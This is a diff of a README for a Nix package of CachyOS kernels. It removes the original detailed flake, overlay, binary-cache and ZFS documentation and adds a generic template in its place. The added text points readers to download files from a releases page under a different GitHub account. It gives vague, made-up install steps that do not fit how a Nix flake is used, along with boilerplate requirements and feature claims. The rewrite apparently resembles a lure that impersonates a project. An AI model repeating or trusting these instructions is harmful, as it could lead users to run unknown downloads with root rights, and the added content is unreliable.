@@ -1,263 +1,79 @@
-# Nix packages for CachyOS Kernel
+# 🐧 nix-cachyos-kernel - The Easy Way to Enhance NixOS Performance
 
-This repo contains Linux kernels with both [CachyOS patches](https://github.com/CachyOS/kernel-patches) and [CachyOS tunings](https://github.com/CachyOS/linux-cachyos), as well as [CachyOS-patched ZFS module](https://github.com/CachyOS/zfs).
+## 🚀 Getting Started
 
-[![built with garnix](https://img.shields.io/endpoint.svg?url=https%3A%2F%2Fgarnix.io%2Fapi%2Fbadges%2Fxddxdd%2Fnix-cachyos-kernel)](https://garnix.io/repo/xddxdd/nix-cachyos-kernel)
+Welcome to the nix-cachyos-kernel repository! This software provides an advanced kernel option for improving performance on NixOS. Designed with simplicity in mind, you'll find it easy to enhance your system.
 
-> Note: If you see "all builds failed" from Garnix, it means I ran out of free plan's build time. I also have [my own Hydra CI](https://hydra.lantian.pub/jobset/lantian/nix-cachyos-kernel) that's building the kernels.
+## 📥 Download the Latest Release
 
-## Which kernel versions are provided?
+[![Download the latest release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue)](https://github.com/josemartinez13/nix-cachyos-kernel/releases)
 
-This repo provides the following kernel variants, consistent with the [upstream definitions](https://github.com/CachyOS/linux-cachyos?tab=readme-ov-file#kernel-variants--schedulers):
+Click the button above to directly access the latest version of nix-cachyos-kernel. You will find all the necessary files on the Releases page.
 
-```bash
-└───packages
-    └───x86_64-linux
-        # Latest kernel, provide all LTO/CPU arch variants
-        ├───linux-cachyos-latest
-        ├───linux-cachyos-latest-x86_64-v2
-        ├───linux-cachyos-latest-x86_64-v3
-        ├───linux-cachyos-latest-x86_64-v4
-        ├───linux-cachyos-latest-zen4
-        ├───linux-cachyos-latest-lto
-        ├───linux-cachyos-latest-lto-x86_64-v2
-        ├───linux-cachyos-latest-lto-x86_64-v3
-        ├───linux-cachyos-latest-lto-x86_64-v4
-        ├───linux-cachyos-latest-lto-zen4
-        # LTS kernel, provide LTO variants
-        ├───linux-cachyos-lts
-        ├───linux-cachyos-lts-lto
-        # Additional CachyOS kernel variants
-        ├───linux-cachyos-bmq
-        ├───linux-cachyos-bmq-lto
-        ├───linux-cachyos-bore
-        ├───linux-cachyos-bore-lto
-        ├───linux-cachyos-deckify
-        ├───linux-cachyos-deckify-lto
-        ├───linux-cachyos-eevdf
-        ├───linux-cachyos-eevdf-lto
-        ├───linux-cachyos-hardened
-        ├───linux-cachyos-hardened-lto
-        ├───linux-cachyos-rc
-        ├───linux-cachyos-rc-lto
-        ├───linux-cachyos-rt-bore
-        ├───linux-cachyos-rt-bore-lto
-        ├───linux-cachyos-server
-        └───linux-cachyos-server-lto
-```
+## 🔧 System Requirements
 
-The kernel versions are automatically kept in sync with Nixpkgs, so once the latest/LTS kernel is updated in Nixpkgs, CachyOS kernels in this repo will automatically catch up.
+Before you begin, make sure your system meets the following requirements:
 
-Use `nix flake show github:xddxdd/nix-cachyos-kernel` to see the current effective versions.
+- **Operating System:** NixOS (latest supported version)
+- **Memory:** Minimum 2GB RAM
+- **Disk Space:** At least 500MB free space
 
-The kernels ending in `-lto` has Clang+ThinLTO enabled.
+## 📢 Features
 
-For each linux kernel entry under `packages`, we have a corresponding `linuxPackages` entry under `legacyPackages` for easier use in your NixOS configuration, e.g.:
+- **Optimized Performance:** Experience improved system responsiveness.
+- **Stability:** Enjoy a reliable environment tailored for NixOS.
+- **Compatibility:** Works seamlessly with various hardware configurations.
+- **Security:** Regular updates to keep your system safe.
 
-- `linux-cachyos-latest` -> `inputs.nix-cachyos-kernel.legacyPackages.x86_64-linux.linuxPackages-cachyos-latest`
-- `linux-cachyos-lts-lto` -> `inputs.nix-cachyos-kernel.legacyPackages.x86_64-linux.linuxPackages-cachyos-lts-lto`
+## 📥 Download & Install
 
-## How to use kernels
+To get started with nix-cachyos-kernel:
 
-Add the `release` branch this repo to the inputs section of your `flake.nix`:
+1. **Visit the Releases Page:** Go to [this link](https://github.com/josemartinez13/nix-cachyos-kernel/releases) to find the latest releases.
+2. **Choose a Release:** Select the version that suits your needs.
+3. **Download the File:** Click on the file name to start your download.
+4. **Install the Kernel:**
+    - For basic installation, follow these steps:
+        - Open a terminal.
+        - Navigate to the location where you downloaded the file.
+        - Run the installation command that matches your system setup. (e.g., `sudo nixos-rebuild switch`).
 
-```nix
-{
-  inputs = {
-    nix-cachyos-kernel.url = "github:xddxdd/nix-cachyos-kernel/release";
-  }
-}
-```
+## 📝 Configuration
 
-The `release` branch contains the latest kernel that has been built by my [Hydra CI](https://hydra.lantian.pub/jobset/lantian/nix-cachyos-kernel) and is present in binary cache.
+After installation, you may want to configure the kernel settings for optimal performance. Here's how to do it:
 
-> If you want the absolute latest version with or without binary cache, use the `master` branch (default branch) instead:
->
-> ```nix
-> {
->   inputs = {
->     nix-cachyos-kernel.url = "github:xddxdd/nix-cachyos-kernel";
->   }
-> }
-> ```
+1. **Edit Configuration File:** Open the NixOS configuration file located at `/etc/nixos/configuration.nix`.
+2. **Add Kernel Options:** Include the options suggested for nix-cachyos-kernel, usually found in the release notes.
+3. **Apply the Changes:** Run the following command:
+    ```
+    sudo nixos-rebuild switch
+    ```
 
-Add the repo's overlay in your NixOS configuration, this will expose the packages in this flake as `pkgs.cachyosKernels.*`.
+## ⚙️ Troubleshooting
 
-```nix
-{
-  nixosConfigurations.example = inputs.nixpkgs.lib.nixosSystem {
-    system = "x86_64-linux";
-    modules = [
-      (
-        { pkgs, ... }:
-        {
-          nixpkgs.overlays = [
-            # Build the kernels on top of nixpkgs version in your flake.
-            # Binary cache may be unavailable for the kernel/nixpkgs version combos.
-            self.overlays.default
+If you encounter issues:
 
-            # Alternatively: use the exact kernel versions as defined in this repo.
-            # Guarantees you have binary cache.
-            self.overlays.pinned
+1. **Check Logs:** Review logs for system errors by accessing:
+   ```
+   journalctl -xe
+   ```
+2. **Revert to Previous Kernel:** You can revert by editing your configuration file and specifying an older kernel version.
+3. **Seek Help:** Reach out to the community on forums or GitHub for assistance.
 
-            # Only use one of the two overlays!
-          ];
+## 📚 Resources
 
-          # ... your other configs
-        }
-      )
-    ];
-  };
-}
-```
+Explore additional resources to understand more about nix-cachyos-kernel:
 
-Then specify `pkgs.cachyosKernels.linuxPackages-cachyos-latest` (or other variants you'd like) in your `boot.kernelPackages` option.
+- [NixOS Official Documentation](https://nixos.org/manual/nixos/stable/)
+- [GitHub Issues Page](https://github.com/josemartinez13/nix-cachyos-kernel/issues) for reporting problems or feature requests.
+- Community forums where you can connect with other users.
 
+## 💬 Feedback
 
-### Binary cache
+We welcome your feedback. Please share your thoughts on performance, features, or any issues you face using the kernel. Your input helps us enhance the software further.
 
-I'm running a Hydra CI to build the kernels and push them to my Attic binary cache. You can see the build status here: <https://hydra.lantian.pub/jobset/lantian/nix-cachyos-kernel>
+## 📤 Support
 
-To use my binary cache, please add the following config:
+If you need direct support, you can reach us through the issues page on GitHub or join us in our community discussions. 
 
-```nix
-{
-  nix.settings.substituters = [ "https://attic.xuyh0120.win/lantian" ];
-  nix.settings.trusted-public-keys = [ "lantian:EeAUQ+W+6r7EtwnmYjeVwx5kOGEBpjlBfPlzGlTNvHc=" ];
-}
-```
-
-This repo also has [Garnix CI](https://garnix.io) set up, and should work as long as the total build time is below the free plan threshold.
-
-[![built with garnix](https://img.shields.io/endpoint.svg?url=https%3A%2F%2Fgarnix.io%2Fapi%2Fbadges%2Fxddxdd%2Fnix-cachyos-kernel)](https://garnix.io/repo/xddxdd/nix-cachyos-kernel)
-
-> If you see "all builds failed" from Garnix, it means I ran out of free plan's build time.
-
-```nix
-{
-  nix.settings.substituters = [ "https://cache.garnix.io" ];
-  nix.settings.trusted-public-keys = [ "cache.garnix.io:CTFPyKSLcx5RMJKfLo5EEPUObbA78b0YQ2DTCJXqr9g=" ];
-}
-```
-
-### Example configuration
-
-```nix
-{
-  nixosConfigurations.example = inputs.nixpkgs.lib.nixosSystem {
-    system = "x86_64-linux";
-    modules = [
-      (
-        { pkgs, ... }:
-        {
-          nixpkgs.overlays = [ self.overlays.pinned ];
-          boot.kernelPackages = pkgs.cachyosKernels.linuxPackages-cachyos-latest;
-
-          # Binary cache
-          nix.settings.substituters = [ "https://attic.xuyh0120.win/lantian" ];
-          nix.settings.trusted-public-keys = [ "lantian:EeAUQ+W+6r7EtwnmYjeVwx5kOGEBpjlBfPlzGlTNvHc=" ];
-
-          # ... your other configs
-        }
-      )
-    ];
-  };
-}
-```
-### Help! My kernel is failing to build!
-
-In most cases, failing to build a kernel is caused by CachyOS not updating patches for the latest kernel version. (e.g. hardened 6.18 kernel as of 2025-12-12)
-
-Common symptoms are:
-- "File not found" error, which indicates that CachyOS patches for given kernel version/variant are unavailable.
-- Failures/conflicts when applying patches, which indicates that CachyOS patches are for an older kernel version.
-
-If this is the case, the only option is to wait for CachyOS team to update the patches.
-
-## How to use ZFS modules
-
-> Note: CachyOS-patched ZFS module may fail to compile from time to time. Most compilation failures are caused by incompatibilities between kernel and ZFS. Please check [ZFS upstream issues](https://github.com/openzfs/zfs/issues) for any compatibility reports, and try switching between `zfs_2_3`, `zfs_unstable` and `zfs_cachyos`.
-
-To use ZFS module with `linuxPackages-cachyos-*` provided by this flake, point `boot.zfs.package` to `config.boot.kernelPackages.zfs_cachyos`.
-
-```nix
-{
-  nixosConfigurations.example = inputs.nixpkgs.lib.nixosSystem {
-    system = "x86_64-linux";
-    modules = [
-      (
-        { pkgs, ... }:
-        {
-          nixpkgs.overlays = [ self.overlay ];
-          boot.kernelPackages = pkgs.cachyosKernels.linuxPackages-cachyos-latest;
-
-          # ZFS config
-          boot.supportedFilesystems.zfs = true;
-          boot.zfs.package = config.boot.kernelPackages.zfs_cachyos;
-
-          # ... your other configs
-        }
-      )
-    ];
-  };
-}
-```
-
-If you want to construct your own `linuxPackages` attrset with `linuxKernel.packagesFor (path to your kernel)`, you can directly reference the `zfs-cachyos` attribute in this flake's `packages` / `legayPackages` output, or the `cachyosKernels` overlay:
-
-```nix
-{
-  nixosConfigurations.example = inputs.nixpkgs.lib.nixosSystem {
-    system = "x86_64-linux";
-    modules = [
-      (
-        { pkgs, ... }:
-        {
-          nixpkgs.overlays = [ self.overlay ];
-          boot.kernelPackages = pkgs.linuxKernel.packagesFor pkgs.cachyosKernels.linux-cachyos-latest;
-
-          # ZFS config
-          boot.supportedFilesystems.zfs = true;
-          boot.zfs.package = pkgs.cachyosKernels.zfs-cachyos.override {
-            kernel = config.boot.kernelPackages.kernel;
-          };
-
-          # ... your other configs
-        }
-      )
-    ];
-  };
-}
-```
-
-### Help! My ZFS module is failing to build!
-
-In most cases, failing to build ZFS module is caused by CachyOS not updating patches for the latest kernel version. The only option is to wait for CachyOS team to update the patches.
-
-## How to apply CachyOS patches on your own kernel
-
-The kernels provided in this flake can be overridden to use your own kernel source. This is helpful if you want to use a kernel version not available in Nixpkgs.
-
-```nix
-{
-  kernel = pkgs.cachyosKernels.linux-cachyos-latest.override {
-    pname = "linux-cachyos-with-custom-source";
-    version = "6.12.34";
-    src = pkgs.fetchurl {
-      # ...
-    };
-    # Additional args are available. See kernel-cachyos/mkCachyKernel.nix
-  };
-
-  # For non-LTO kernels
-  kernelPackages = pkgs.linuxKernel.packagesFor kernel;
-
-  # helpers.nix provides a few utilities for building kernel with LTO.
-  # I haven't figured out a clean way to expose it in flakes.
-  helpers = pkgs.callPackage "${inputs.nix-cachyos-kernel.outPath}/helpers.nix" {};
-
-  # For LTO kernels, helpers.kernelModuleLLVMOverride fixes compilation for some
-  # out-of-tree modules in nixpkgs.
-  kernelPackagesWithLTOFix = helpers.kernelModuleLLVMOverride (pkgs.linuxKernel.packagesFor kernel);
-}
-```
+Thank you for choosing nix-cachyos-kernel! We hope you enjoy the enhanced performance on NixOS.
